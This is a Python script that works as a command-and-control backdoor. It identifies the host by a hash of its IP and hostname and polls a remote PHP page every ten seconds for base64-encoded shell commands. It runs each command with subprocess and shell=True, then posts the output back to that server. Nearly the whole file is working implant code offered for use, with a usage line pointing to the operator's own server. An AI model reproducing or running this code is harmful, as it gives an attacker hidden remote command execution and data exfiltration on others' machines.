#!/usr/bin/python

import sys
import requests
import socket
import os
import hashlib
import struct
import time
import subprocess
import base64

sleepTime=10	# The amount of seconds to sleep between web requests
#
# http://stackoverflow.com/questions/11735821/python-get-localhost-ip
if os.name != "nt":
    import fcntl
    def get_interface_ip(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])

def getMachineID():
    ip = socket.gethostbyname(socket.gethostname())
    hostName = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = [
            "eth0",
            "eth1",
            "eth2",
            "wlan0",
            "wlan1",
            "wifi0",
            "ath0",
            "ath1",
            "ppp0",
            ]
        for ifname in interfaces:
            try:
                ip = get_interface_ip(ifname)
                break
            except IOError:
                pass	
    # Hash IP
    uniqID = ip + hostName
    hashedIP = hashlib.sha1(uniqID).hexdigest()
    return hashedIP

def syncRequest(mID, osN, wAddr):
	# http://stackoverflow.com/questions/645312/what-is-the-quickest-way-to-http-get-in-python
	url = wAddr + "?func=sync&machineID=" + mID + "&osName=" + osN
	r = requests.get(url)
	#print url
	#print r.content
	return r.status_code

def doRequest(mID, wAddr):
	url = wAddr + "?func=do&machineID=" + mID
	headers = {'Accept-encoding':'gzip'}
	r = requests.get(url, headers=headers)
	commandReturned = r.content.lstrip()
	commandReturned = base64.b64decode(commandReturned.rstrip())
	# Uncomment the below line if you would like the command you are executing to display on the client...
	#print commandReturned
	return commandReturned

def executeCommand(com):
	comExec = subprocess.Popen(str(com), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	STDOUT, STDERR = comExec.communicate()
	if STDOUT:
		encodedOutput = base64.b64encode(STDOUT)
	else:
		encodedOutput = base64.b64encode("Invalid Command...")
	return encodedOutput

def postOutput(mID, comExec, outputC, wAddr):
	url = wAddr
	r = requests.post(url, data={'machineID':mID, 'command':comExec, 'output':outputC})
	return str(r.status_code) + " " + r.content

# -------------------- Main ---------------

def main():
	#websiteAddr="http://192.168.242.1/index.php" # This is the address and page that it calls back to
	if len(sys.argv) == 2:
		websiteAddr = sys.argv[1]
		#print websiteAddr
		machineID = getMachineID()  # Gathers the hostname and the IP Address and returns it as the machine ID
		osName = os.name
		statusCode = syncRequest(machineID, osName, websiteAddr)      # Sends an initial request to the database of the machine ID - Allows db to create entry if it does not exist
		while True:
			time.sleep(sleepTime)	
			if (statusCode == 200):
				command = doRequest(machineID, websiteAddr)	
				if command == "NOTHING":
					continue
				else:
					outputCommand = executeCommand(command)
					encodedCommand = base64.b64encode(command)
					uploadStatus = postOutput(machineID, encodedCommand, outputCommand, websiteAddr)
					#print uploadStatus.strip()
	else:
		print "Usage: ./script.py \"http://www.yourremoteserver.com/index.php\""
		print "The URL above has to be the location of where you placed your PHP"

if __name__ == "__main__":
	main()
